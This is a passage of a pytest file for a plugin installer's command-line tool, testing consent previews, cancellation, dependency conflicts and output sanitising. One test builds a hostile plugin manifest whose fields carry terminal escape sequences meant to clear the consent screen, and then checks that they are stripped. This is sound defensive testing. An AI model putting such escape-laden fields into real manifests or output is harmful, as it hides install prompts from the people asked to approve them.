    next `cdui start`."""
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    fake_github({"cdui.plugin.toml": _TEMPLATE_MANIFEST,
                 "nodes/hello.py": "VALUE = 1\n"})
    asked = _records_reload(monkeypatch)

    assert _official(_install_args()) == 0
    assert asked == ["reload"]
    # No server, so the answer is the offer rather than a failure.
    assert "next `cdui start`" in _out(capsys)


def test_a_refused_install_does_not_ask_the_server_for_anything(
    isolated_lockfile, fake_github, monkeypatch, capsys
):
    """Nothing was installed, so there is nothing to pick up: a reload here
    would bump the generation the editor polls over an install that did not
    happen."""
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    fake_github(_PREVIEW_FILES)
    asked = _records_reload(monkeypatch)

    assert _official(_install_args(accept_capabilities=True)) == 1
    assert asked == []


def test_the_preview_shows_no_character_a_terminal_would_obey(
    isolated_lockfile, fake_github, monkeypatch, capsys
):
    """The consent screen is the one place author text must not be able to
    redraw itself: a description carrying a clear-screen sequence or a bare
    carriage return erases the question it was printed under, and the answer
    somebody gives is then an answer about text they cannot see."""
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    # Written as TOML escapes, which is the only way a manifest can carry
    # them: a raw control byte in a basic string is a TOML parse error, so
    # this is the shape a real hostile manifest has to take.
    hostile = dedent("""\
        [plugin]
        id = "official-template"
        name = "Innocent\\u001B[31m"
        version = "1.0.0"
        description = "Harmless.\\u001B[2J\\rInstalling: nothing at all"
        schema_version = 1

        [python_deps]
        tabulate = ">=0.9\\u001B[31m"

        [security]
        allowed_modules = ["os\\u001B[2J"]
        """)
    assert "\x1b" in tomllib.loads(hostile)["plugin"]["description"]
    fake_github({"cdui.plugin.toml": hostile, "nodes/hello.py": "VALUE = 1\n"})

    def _never(*_a, **_k):  # pragma: no cover - only runs on a bug
        raise AssertionError("a refused install must not download anything")

    monkeypatch.setattr(plugin_cli, "download_tarball", _never)

    # Refused at the trust gate, which runs AFTER the whole preview has been
    # printed -- so this is the screen, in full, of a plugin nobody has said
    # yes to yet. That is the moment the escape sequences would have to work.
    assert _official(_install_args()) == 1

    printed = _out(capsys)
    assert "\x1b" not in printed, "nothing a terminal acts on reached the screen"
    assert "\r" not in printed
    # The words survive; only what a terminal acts on is gone. Every line the
    # consent screen draws from the manifest is here: the name, the
    # description, the module list the AST gate would be turned off for, and
    # the package this install would add to the venv.
    assert "Innocent" in printed and "Harmless." in printed
    assert "os" in printed and "--trust-author" in printed
    assert "tabulate>=0.9" in printed


def test_a_long_description_cannot_scroll_the_preview_away(monkeypatch):
    """Same screen, the other way to clear it. Capped rather than wrapped:
    a preview whose description is the height of the terminal has pushed
    everything a person needs to read off the top of it."""
    assert plugin_cli._plain("x" * 500).endswith("...")
    assert len(plugin_cli._plain("x" * 500)) == 203
    assert plugin_cli._plain("two\nlines") == "two lines", "no run-on words"
    assert plugin_cli._plain(None) == ""


def test_a_version_that_is_not_a_string_still_gets_a_line(capsys):
    """TOML hands `version = 1.0` over as a float, and `_plain` answers ""
    for anything that is not a string -- so asking it whether to print the
    line dropped a field this command exists to show. The raw value decides
    that; the filter only decides how it is spelt."""
    plugin_cli._print_info(
        "extras",
        {"plugin": {"name": "Extras", "version": 1.0, "description": 2}},
        {"source_kind": "github_url", "source": "alice/extras"},
        None,
        installed=False,
    )
    printed = _out(capsys)
    assert "version" in printed and "1.0" in printed
    assert "description" in printed and "2" in printed


def test_ctrl_c_during_one_pack_stops_sync_rather_than_starting_the_next(
    isolated_lockfile, monkeypatch, capsys
):
    """A 130 is an answer about the whole command. Treated as an ordinary
    failure it meant "continuing with the rest", so Ctrl-C during one pack's
    `uv pip install` started the next pack's download."""
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    asked: list[str] = []

    def _interrupted(plugin_id, args, lockfile):
        asked.append(plugin_id)
        return 130

    monkeypatch.setattr(plugin_cli, "_install_catalog", _interrupted)

    pending = core_catalog.available_builtin_packs(
        plugin_cli.load_catalog(), {"plugins": {}}
    )
    assert len(pending) >= 2, "the premise: there is a second pack to ask about"

    rc = plugin_cli.cmd_sync(
        argparse.Namespace(dry_run=False, prune=False, yes=True)
    )
    assert rc == 130
    assert len(asked) == 1, "the second pack was never asked about"
    assert "Stopped" in _out(capsys)


def test_packages_that_cannot_be_installed_here_are_exit_3_with_the_command(
    isolated_lockfile, fake_github, monkeypatch, capsys
):
    """A resolver conflict is not a broken plugin.

    The constraints file pins every distribution this interpreter has
    already imported, so "no solution found" means the packages would have
    to replace one the server is holding open -- which is true until the
    server stops, and would be true again on every retry. Its own exit code,
    so a script that retries on 1 does not retry this forever, and the line
    to type is printed rather than described.
    """
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    fake_github(_PREVIEW_FILES)

    def _conflicted(specs, *, constraints_path, emit, cancel_check, cwd,
                    tail=None):
        if tail is not None:
            tail.append("  x No solution found when resolving dependencies:")
        return 1

    monkeypatch.setattr("app.core.packs.runner.run_pip", _conflicted)

    assert _official(_install_args(
        accept_capabilities=True, trust_author=True)) == 3
    printed = _out(capsys)
    assert "uv pip install" in printed
    assert "tabulate>=0.9" in printed
    # Dependencies run BEFORE anything is staged, so a conflict leaves
    # nothing on disk and nothing in the lockfile to undo.
    assert plugin_loader.load_lockfile()["plugins"] == {}
    assert not (isolated_lockfile / "official-template").exists()
    assert not (isolated_lockfile / ".staging").exists()


def test_ctrl_c_stops_the_install_at_130_and_writes_nothing(
    isolated_lockfile, fake_github, monkeypatch, capsys
):
    """SIGINT sets a flag the install polls; it never raises through it.

    A ``KeyboardInterrupt`` thrown out of the handler would skip the flow's
    own cancellation path -- the one that removes the half-written download
    and the staging copy -- and print a traceback where "Cancelled" belongs.
    So the handler the CLI installed is called from inside the download,
    exactly as the OS would call it, and what is asserted is the exit code,
    the empty lockfile and the handler being put back afterwards.
    """
    monkeypatch.setenv("CODEFYUI_LANG", "en")
    fake_github({
        "cdui.plugin.toml": _TEMPLATE_MANIFEST,
        "nodes/hello.py": "VALUE = 1\n",
    })
    served = plugin_cli.download_tarball
    before = signal.getsignal(signal.SIGINT)

    def _interrupted(owner, repo, sha, dest, **kwargs):
        handler = signal.getsignal(signal.SIGINT)
        assert callable(handler), "the install installs its own SIGINT handler"
        assert handler is not before
        handler(signal.SIGINT, None)
        served(owner, repo, sha, dest, **kwargs)

    monkeypatch.setattr(plugin_cli, "download_tarball", _interrupted)

    assert _official(_install_args()) == 130
    assert "Cancelled" in _out(capsys)
    assert plugin_loader.load_lockfile()["plugins"] == {}
    assert not (isolated_lockfile / "official-template").exists()
    assert not (isolated_lockfile / ".staging").exists()
    # Restored, so a `cdui plugin sync` installing five packs does not end
    # up with five nested handlers.
    assert signal.getsignal(signal.SIGINT) is before
